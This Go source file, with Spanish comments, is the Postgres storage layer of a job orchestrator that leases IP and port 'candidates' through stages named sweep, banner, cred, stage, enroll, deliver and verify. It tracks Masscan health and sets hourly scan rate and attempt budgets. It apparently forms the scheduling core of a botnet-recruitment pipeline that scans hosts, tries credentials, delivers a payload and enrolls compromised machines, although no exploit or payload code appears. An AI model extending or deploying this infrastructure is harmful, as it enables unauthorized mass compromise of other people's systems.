package recruit

import (
	"context"
	"database/sql"
	"errors"
	"fmt"
	"log"
	"sort"
	"strings"
	"sync"
	"time"

	_ "github.com/jackc/pgx/v5/stdlib"
)

// Store es el acceso a Postgres del servicio. Pool acotado: el motor es
// compartido con el backend y el host con otros servicios (A2-01).
type Store struct {
	db  *sql.DB
	dsn string

	mu       sync.Mutex
	claimLat []int64 // ms de las ultimas 1000 reclamaciones
}

// Open abre el pool. `pool` <= 0 usa 8, que es el tope del backend.
func Open(dsn string, pool int) (*Store, error) {
	if dsn == "" {
		return nil, errors.New("recruit: DATABASE_URL requerido")
	}
	if pool <= 0 {
		pool = 8
	}
	db, err := sql.Open("pgx", dsn)
	if err != nil {
		return nil, err
	}
	db.SetMaxOpenConns(pool)
	db.SetMaxIdleConns(pool / 2)
	db.SetConnMaxIdleTime(5 * time.Second)
	db.SetConnMaxLifetime(30 * time.Minute)
	if err := db.Ping(); err != nil {
		db.Close()
		return nil, fmt.Errorf("recruit: ping: %w", err)
	}
	return &Store{db: db, dsn: dsn}, nil
}

// dsnForTest devuelve el DSN con el que se abrio (reabrir en pruebas).
func (s *Store) dsnForTest() string { return s.dsn }

// Close cierra el pool.
func (s *Store) Close() error { return s.db.Close() }

// Heartbeat estampa el latido del orquestador. Es el que mira /healthz:
// un proceso vivo pero mudo tiene que salir rojo (A2-03).
func (s *Store) Heartbeat(ctx context.Context, rateClass int) error {
	_, err := s.db.ExecContext(ctx, `
		UPDATE recruit_control
		   SET tick_at = now(), rate_class = $1, updated_at = now()
		 WHERE id = 1`, rateClass)
	return err
}

// Health es el estado que publica /healthz.
type Health struct {
	DB        bool
	Masscan   bool
	TickAge   time.Duration
	RateClass int
	Paused    bool
}

// StaleAfter es la edad de latido a partir de la cual el servicio se
// declara mudo.
const StaleAfter = 90 * time.Second

// Health lee el control y el latido.
func (s *Store) Health(ctx context.Context, masscanOK bool) (Health, error) {
	var h Health
	h.Masscan = masscanOK
	var tick sql.NullTime
	var rate int
	var paused bool
	err := s.db.QueryRowContext(ctx, `
		SELECT tick_at, rate_class, paused FROM recruit_control WHERE id = 1`).
		Scan(&tick, &rate, &paused)
	if err != nil {
		return h, err
	}
	h.DB = true
	h.RateClass = rate
	h.Paused = paused
	if tick.Valid {
		h.TickAge = time.Since(tick.Time)
	} else {
		h.TickAge = time.Duration(1<<62 - 1)
	}
	return h, nil
}

// SetPaused para y reanuda el reparto sin reiniciar el proceso.
func (s *Store) SetPaused(ctx context.Context, paused bool) error {
	_, err := s.db.ExecContext(ctx, `
		UPDATE recruit_control SET paused = $1, updated_at = now() WHERE id = 1`, paused)
	return err
}

// Claimed es una fila reclamada por un worker.
type Claimed struct {
	CandidateID int64     `json:"candidate_id"`
	IP          string    `json:"ip"`
	Port        int       `json:"port"`
	Stage       string    `json:"stage"`
	Attempt     int       `json:"attempt"`
	LeaseToken  int64     `json:"lease_token"`
	LeaseOwner  string    `json:"lease_owner"`
	LeaseUntil  time.Time `json:"lease_until"`
}

// LeaseDurationByPhase da el lease de cada fase: el barrido es corto y la
// entrega larga (A2-04). Nada de un lease unico de 300 s.
func LeaseDurationByPhase(stage string) time.Duration {
	switch stage {
	case "sweep":
		return 30 * time.Second
	case "banner":
		return 120 * time.Second
	case "cred":
		return 300 * time.Second
	case "stage":
		return 300 * time.Second
	case "enroll":
		return 600 * time.Second
	case "deliver":
		return 900 * time.Second
	case "verify":
		return 120 * time.Second
	default:
		return 300 * time.Second
	}
}

// Claim reclama hasta `limit` candidatos de una fase con SKIP LOCKED: dos
// workers no pueden recibir la misma fila (injerto V2). El lease sube el
// token, que es el fencing: el commit compara dueño y token.
func (s *Store) Claim(ctx context.Context, stage, worker string, limit int) ([]Claimed, error) {
	if limit <= 0 || limit > 100 {
		limit = 5
	}
	secs := int(LeaseDurationByPhase(stage).Seconds())
	inicio := time.Now()
	var rows *sql.Rows
	var err error
	// Reintento corto ante deadlock/serializacion: con varios reclamadores
	// el motor puede abortar una transaccion y perder un reclamo.
	for intento := 0; intento < 3; intento++ {
		rows, err = s.db.QueryContext(ctx, `
		WITH picked AS MATERIALIZED (
		  SELECT candidate_id FROM recruit_candidates
		   WHERE ((state IN ('eligible','deferred') AND next_attempt_at <= now())
		           OR (lease_expires_at IS NOT NULL AND lease_expires_at < now()))
		     AND (lease_expires_at IS NULL OR lease_expires_at < now())
		   ORDER BY next_attempt_at
		   LIMIT $1
		   FOR UPDATE SKIP LOCKED
		)
		UPDATE recruit_candidates c
		   SET lease_owner = $2,
		       lease_token = c.lease_token + 1,
		       lease_expires_at = now() + make_interval(secs => $3),
		       -- un reclaim de una fase en vuelo conserva su estado: solo
		       -- las filas de cola pasan a 'sweeping'.
		       state = CASE WHEN c.state IN ('eligible','deferred') THEN 'sweeping' ELSE c.state END,
		       updated_at = now()
		  FROM picked p
		 WHERE c.candidate_id = p.candidate_id
		   -- re-chequeo del lease en el UPDATE: si otro se adelanto entre
		   -- el SELECT y aqui, esta fila se salta en vez de duplicarse.
		   AND (c.state IN ('eligible','deferred') OR c.lease_expires_at < now())
		   AND (c.lease_expires_at IS NULL OR c.lease_expires_at < now())
		RETURNING c.candidate_id, c.ip::text, c.port, c.lease_token,
		          c.lease_owner, c.lease_expires_at`, limit, worker, secs)
		if err == nil || !esReintentable(err) {
			break
		}
	}
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	s.recordClaimLatency(time.Since(inicio))
	var out []Claimed
	for rows.Next() {
		var c Claimed
		if err := rows.Scan(&c.CandidateID, &c.IP, &c.Port, &c.LeaseToken,
			&c.LeaseOwner, &c.LeaseUntil); err != nil {
			return nil, err
		}
		c.Stage = stage
		out = append(out, c)
	}
	return out, rows.Err()
}

// ErrLeaseStale marca el commit de un worker que perdio la fila.
var ErrLeaseStale = errors.New("recruit: lease_stale")

// Transition mueve el candidato y escribe la auditoria en la misma
// transaccion. El UPDATE lleva dueño y token: un zombi no escribe encima.
func (s *Store) Transition(ctx context.Context, id int64, owner string, token int64, to State, reason, actor string) error {
	return s.TransitionOutcome(ctx, id, owner, token, to, reason, actor, "")
}

// TransitionOutcome es Transition con el resultado del ciclo: `deferred`
// programa el respaldo 2^n y solo un ciclo que trabajo (ok/fail/timeout)
// mueve el reloj de edad — quedarse sin presupuesto no envejece (V2).
func (s *Store) TransitionOutcome(ctx context.Context, id int64, owner string, token int64, to State, reason, actor, outcome string) error {
	if ReasonRequired(to) && reason == "" {
		return fmt.Errorf("recruit: el estado %s exige motivo", to)
	}
	tx, err := s.db.BeginTx(ctx, nil)
	if err != nil {
		return err
	}
	defer tx.Rollback()

	var from State
	var curOwner sql.NullString
	var curToken int64
	err = tx.QueryRowContext(ctx, `
		SELECT state, lease_owner, lease_token FROM recruit_candidates
		 WHERE candidate_id = $1 FOR UPDATE`, id).Scan(&from, &curOwner, &curToken)
	if err != nil {
		return err
	}
	if owner != "" && (curOwner.String != owner || curToken != token) {
		return ErrLeaseStale
	}
	if err := Transition(from, to); err != nil {
		return err
	}
	var backoff sql.NullInt64
	if to == StateDeferred {
		var attempts int
		if err := tx.QueryRowContext(ctx, `
			SELECT stage_attempts + 1 FROM recruit_candidates WHERE candidate_id = $1`, id).Scan(&attempts); err != nil {
			return err
		}
		backoff = sql.NullInt64{Int64: int64(Backoff(attempts).Seconds()), Valid: true}
	}
	res, err := tx.ExecContext(ctx, `
		UPDATE recruit_candidates
		   SET state = $4, fail_reason = CASE WHEN $5 = '' THEN NULL ELSE $5 END,
		       stage_attempts = LEAST(stage_attempts + CASE WHEN $4 = 'deferred' THEN 1 ELSE 0 END, 8),
		       next_attempt_at = CASE WHEN $6::bigint IS NULL THEN next_attempt_at
		                              ELSE now() + make_interval(secs => $6::int) END,
		       age_clock_at = CASE WHEN $7 THEN now() ELSE age_clock_at END,
		       lease_owner = NULL, lease_expires_at = NULL, updated_at = now()
		 WHERE candidate_id = $1 AND lease_owner IS NOT DISTINCT FROM NULLIF($2,'')
		   AND lease_token = $3`, id, owner, token, string(to), reason, backoff, AdvanceAge(outcome))
	if err != nil {
		return err
	}
	if n, _ := res.RowsAffected(); n == 0 {
		return ErrLeaseStale
	}
	var seq int
	if err := tx.QueryRowContext(ctx, `
		SELECT COALESCE(max(seq),0) + 1 FROM recruit_candidate_events
		 WHERE candidate_id = $1`, id).Scan(&seq); err != nil {
		return err
	}
	if _, err := tx.ExecContext(ctx, `
		INSERT INTO recruit_candidate_events
		  (candidate_id, seq, from_state, to_state, reason, actor)
		VALUES ($1,$2,$3,$4,NULLIF($5,''),$6)`, id, seq, string(from), string(to), reason, actor); err != nil {
		return err
	}
	return tx.Commit()
}

// RenewLease estira el lease mientras el trabajo sigue vivo.
func (s *Store) RenewLease(ctx context.Context, id int64, owner string, token int64, stage string) error {
	secs := int(LeaseDurationByPhase(stage).Seconds())
	res, err := s.db.ExecContext(ctx, `
		UPDATE recruit_candidates
		   SET lease_expires_at = now() + make_interval(secs => $4), updated_at = now()
		 WHERE candidate_id = $1 AND lease_owner = $2 AND lease_token = $3`,
		id, owner, token, secs)
	if err != nil {
		return err
	}
	if n, _ := res.RowsAffected(); n == 0 {
		return ErrLeaseStale
	}
	log.Printf("lease_renew candidate=%d owner=%s token=%d stage=%s", id, owner, token, stage)
	return nil
}

// recordClaimLatency guarda la muestra y acota el anillo a 1000.
func (s *Store) recordClaimLatency(d time.Duration) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.claimLat = append(s.claimLat, d.Milliseconds())
	if len(s.claimLat) > 1000 {
		s.claimLat = s.claimLat[len(s.claimLat)-1000:]
	}
}

// ClaimP95 devuelve el p95 de latencia de claim en ms (0 sin muestras).
func (s *Store) ClaimP95() int64 {
	s.mu.Lock()
	defer s.mu.Unlock()
	if len(s.claimLat) == 0 {
		return 0
	}
	cp := append([]int64(nil), s.claimLat...)
	sort.Slice(cp, func(i, j int) bool { return cp[i] < cp[j] })
	idx := (len(cp) * 95) / 100
	if idx >= len(cp) {
		idx = len(cp) - 1
	}
	return cp[idx]
}

// ControlState lee pausa, clase y override manual (manual = -1 si no hay).
func (s *Store) ControlState(ctx context.Context) (class int, manual int, paused bool, err error) {
	var m sql.NullInt64
	err = s.db.QueryRowContext(ctx, `
		SELECT rate_class, manual_rate_class, paused FROM recruit_control WHERE id = 1`).
		Scan(&class, &m, &paused)
	if m.Valid {
		manual = int(m.Int64)
	} else {
		manual = -1
	}
	return class, manual, paused, err
}

// WindowRateClass es la clase que manda la politica para la hora UTC actual.
func (s *Store) WindowRateClass(ctx context.Context) (int, error) {
	var c int
	err := s.db.QueryRowContext(ctx, `
		SELECT rate_class FROM recruit_window_policy WHERE hour_utc = $1`,
		time.Now().UTC().Hour()).Scan(&c)
	if err == sql.ErrNoRows {
		return 1, nil
	}
	return c, err
}

// RollWindow cierra la ventana abierta (si toca) y abre la hora actual.
// Idempotente: si la ventana de esta hora ya existe no crea nada.
func RollWindow(ctx context.Context, st *Store) (int, error) {
	class, err := st.WindowRateClass(ctx)
	if err != nil {
		return 0, err
	}
	return st.rollWindow(ctx, class)
}

func (s *Store) rollWindow(ctx context.Context, class int) (int, error) {
	res, err := s.db.ExecContext(ctx, `
		WITH hora AS (SELECT date_trunc('hour', now()) AS ws)
		INSERT INTO recruit_windows (window_start, rate_class, pps_budget, conn_budget, attempt_budget)
		SELECT ws, $1::smallint,
		       (CASE $1::int WHEN 0 THEN 0 WHEN 1 THEN 1500 WHEN 2 THEN 2500
		                      WHEN 3 THEN 4000 ELSE 5000 END), 30, 60
		  FROM hora
		ON CONFLICT (window_start) DO NOTHING`, class)
	if err != nil {
		return 0, err
	}
	n, _ := res.RowsAffected()
	if _, err := s.db.ExecContext(ctx, `
		UPDATE recruit_windows SET closed_at = now()
		 WHERE closed_at IS NULL AND window_start < date_trunc('hour', now())`); err != nil {
		return int(n), err
	}
	return int(n), nil
}

// esReintentable marca los abortos y cortes de transporte que valen un
// reintento. El motor portable de Windows suelta wsarecv bajo carga y un
// claim se puede repetir sin efecto doble (SKIP LOCKED).
func esReintentable(err error) bool {
	if err == nil {
		return false
	}
	txt := err.Error()
	for _, frag := range []string{"deadlock detected", "could not serialize",
		"SQLSTATE 40001", "SQLSTATE 40P01", "wsarecv", "connection reset",
		"broken pipe", "unexpected EOF", "i/o timeout"} {
		if strings.Contains(txt, frag) {
			return true
		}
	}
	return false
}
